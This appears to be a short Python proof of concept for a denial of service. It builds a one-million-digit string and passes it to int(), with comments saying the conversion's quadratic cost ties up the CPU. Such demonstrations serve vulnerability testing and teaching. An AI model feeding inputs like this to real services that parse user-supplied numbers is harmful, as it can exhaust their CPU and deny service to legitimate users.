# Define a malicious string
# This string has 1000000 digits
string = "1" * 1000000

# Convert the string to an integer using int()
# This will trigger the vulnerability in Python
# The int() function will use a quadratic algorithm
# This will result in a CPU denial of service
integer = int(string)